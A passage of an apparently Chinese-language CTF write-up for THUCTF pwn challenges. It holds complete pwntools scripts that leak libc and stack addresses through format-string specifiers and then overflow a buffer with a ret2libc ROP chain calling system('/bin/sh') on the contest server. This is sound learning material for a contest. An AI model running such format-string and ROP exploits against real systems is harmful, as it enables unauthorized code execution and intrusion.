<span><span style="color: #637777"># sh = process([&#39;./ld-linux-x86-64.so.2&#39;, &#39;./childrenstack&#39;], env={&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;})</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">52087</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">(less than 0x20 characters)</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">%25$p</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">flag:</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">libc </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">What will you do</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">What will you do</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">strip</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">16</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> offset</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">capture it?:</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">a</span><span style="color: #D9F5DD">&#39;</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">78</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">libc </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> poprdi</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">libc </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> binsh</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">libc </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> system</span><span style="color: #D6DEEB">))</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">interactive</span><span style="color: #D6DEEB">()</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span></span>
<span><span style="color: #403F53">binsh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">1d8698</span></span>
<span><span style="color: #403F53">system </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">508f2</span></span>
<span><span style="color: #403F53">poprdi </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2a3e5</span></span>
<span><span style="color: #403F53">offset </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">-0x</span><span style="color: #AA0982">29d90</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process([&#39;./ld-linux-x86-64.so.2&#39;, &#39;./childrenstack&#39;], env={&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;})</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">52087</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">(less than 0x20 characters)</span><span style="color: #111111">&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">%25$p</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">flag:</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">libc </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">What will you do</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">What will you do</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span><span style="color: #4876D6">.</span><span style="color: #0C969B">strip</span><span style="color: #403F53">()</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">16</span><span style="color: #403F53">) </span><span style="color: #994CC3">+</span><span style="color: #403F53"> offset</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">capture it?:</span><span style="color: #111111">&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">a</span><span style="color: #111111">&#39;</span><span style="color: #4876D6"> </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">78</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #4876D6">libc </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> poprdi</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #4876D6">libc </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> binsh</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #4876D6">libc </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> system</span><span style="color: #403F53">))</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">interactive</span><span style="color: #403F53">()</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/babystack-flag2.8cea42e5.webp"><img srcset="/assets/babystack-flag2.f9df0495.png" loading="lazy" src="/assets/babystack-flag2.f9df0495.png" width="457" height="152" alt="flag2"></picture></p>
<h4 id="level-3-3" class="heading"><a href="#level-3-3" class="heading-anchor" aria-label="章节： Level 3" tabindex="-1"></a><span>Level 3</span></h4>
<p>被 hint 拐去学了一下 format string 写<span class="mojikumi-line-end">，</span>结果试了下用和 level 2 一样的做法就能过<span class="mojikumi-line-end">，</span>感觉 unintended 了<span class="mojikumi-line-start">（</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-17"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-17--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span></span>
<span><span style="color: #D6DEEB">binsh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">1d8698</span></span>
<span><span style="color: #D6DEEB">system </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">508f2</span></span>
<span><span style="color: #D6DEEB">poprdi </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2a3e5</span></span>
<span><span style="color: #D6DEEB">offset </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-0x</span><span style="color: #F78C6C">29d90</span></span>
<span></span>
<span><span style="color: #637777"># sh = process([&#39;./ld-linux-x86-64.so.2&#39;, &#39;./teenagerstack&#39;], env={&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;})</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">52251</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">(less than 0x20 characters)</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">%21$p</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">flag:</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">start </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvline</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">()</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">strip</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">16</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> offset</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">capture it?:</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">a</span><span style="color: #D9F5DD">&#39;</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">78</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">start </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> poprdi</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">start </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> binsh</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">start </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> system</span><span style="color: #D6DEEB">))</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">again? :</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">a</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">interactive</span><span style="color: #D6DEEB">()</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span></span>
<span><span style="color: #403F53">binsh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">1d8698</span></span>
<span><span style="color: #403F53">system </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">508f2</span></span>
<span><span style="color: #403F53">poprdi </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2a3e5</span></span>
<span><span style="color: #403F53">offset </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">-0x</span><span style="color: #AA0982">29d90</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process([&#39;./ld-linux-x86-64.so.2&#39;, &#39;./teenagerstack&#39;], env={&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;})</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">52251</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">(less than 0x20 characters)</span><span style="color: #111111">&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">%21$p</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">flag:</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">start </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvline</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">()</span><span style="color: #4876D6">.</span><span style="color: #0C969B">strip</span><span style="color: #403F53">()</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">16</span><span style="color: #403F53">) </span><span style="color: #994CC3">+</span><span style="color: #403F53"> offset</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">capture it?:</span><span style="color: #111111">&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">a</span><span style="color: #111111">&#39;</span><span style="color: #4876D6"> </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">78</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #4876D6">start </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> poprdi</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #4876D6">start </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> binsh</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #4876D6">start </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> system</span><span style="color: #403F53">))</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">again? :</span><span style="color: #111111">&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">a</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">interactive</span><span style="color: #403F53">()</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/babystack-flag3.d633816c.webp"><img srcset="/assets/babystack-flag3.d643293d.png" loading="lazy" src="/assets/babystack-flag3.d643293d.png" width="470" height="154" alt="flag3"></picture></p>
<h3 id="初学-c-语言" class="heading"><a href="#初学-c-语言" class="heading-anchor" aria-label="章节： 初学 C 语言" tabindex="-1"></a><span>初学 C 语言</span></h3>
<h4 id="level-1-9" class="heading"><a href="#level-1-9" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>代码中 <code>printf</code> 的 format string 可控制<span class="mojikumi-line-end">，</span>从而可以通过 <code>%llx %llx %llx ... %llx</code> 或 <code>%7$llx</code> 读取到栈上的数据<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-18"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-18--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span></span>
<span><span style="color: #637777"># sh = process(&#39;./pwn&#39;)</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50296</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">10</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">instruction:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&#39;llx:%</span><span style="color: #82AAFF">{i}</span><span style="color: #ECC48D">$llx&#39;</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">encode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">llx:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    line </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> sh.</span><span style="color: #B2CCD6">recvline</span><span style="color: #D6DEEB">().</span><span style="color: #B2CCD6">strip</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">line</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        line </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">0</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> line</span></span>
<span><span style="color: #D6DEEB">    line </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">bytes</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">fromhex</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">line.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> line</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">::</span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">]) </span><span style="color: #637777"># convert endian</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process(&#39;./pwn&#39;)</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50296</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">10</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">instruction:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">f</span><span style="color: #C96765">&#39;llx:%</span><span style="color: #4876D6">{i}</span><span style="color: #C96765">$llx&#39;</span><span style="color: #4876D6">.</span><span style="color: #0C969B">encode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">    sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">llx:</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    line </span><span style="color: #994CC3">=</span><span style="color: #403F53"> sh.</span><span style="color: #0C969B">recvline</span><span style="color: #403F53">().</span><span style="color: #0C969B">strip</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">line</span><span style="color: #403F53">) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53"> </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        line </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">0</span><span style="color: #111111">&#39;</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> line</span></span>
<span><span style="color: #403F53">    line </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">bytes</span><span style="color: #403F53">.</span><span style="color: #0C969B">fromhex</span><span style="color: #403F53">(</span><span style="color: #4876D6">line.</span><span style="color: #0C969B">decode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #111111">,</span><span style="color: #4876D6"> line</span><span style="color: #403F53">[</span><span style="color: #4876D6">::</span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">]) </span><span style="color: #989FB1"># convert endian</span></span></code></pre></div></section>
